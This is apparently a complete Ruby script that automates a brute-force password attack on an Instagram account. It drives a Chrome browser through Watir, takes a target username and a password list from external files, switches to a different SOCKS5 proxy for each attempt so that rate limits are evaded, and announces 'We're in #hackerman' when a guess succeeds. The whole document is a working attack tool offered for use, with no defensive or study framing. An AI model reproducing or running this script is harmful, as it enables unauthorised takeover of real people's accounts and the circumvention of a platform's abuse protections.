require 'watir'
require_relative 'creds'
require_relative 'prox'

username = $username
counter=0

loop do
	$password.each { |val|
	
	# Open Browser, Navigate to Login page
	browser = Watir::Browser.new :chrome, :switches => ['--proxy-server=socks5://'+"#{$proxy[counter]}"]
	browser.goto "instagram.com/accounts/login/"
	puts "#{$proxy[counter]}"
	# Navigate to Username and Password fields, inject info
	puts "Logging in..."
	browser.text_field(:name => "username").set "#{username}"
	browser.text_field(:name => "password").set "#{val}"
	browser.button(:class => '_0mzm- sqdOP  L3NKy').click

	sleep(5)
	counter= counter+1
	if browser.button(:class => '_0mzm- sqdOP  L3NKy').exists?
		browser.close
	else
		print "\a"
		puts "We're in #hackerman"
	end
	}
end
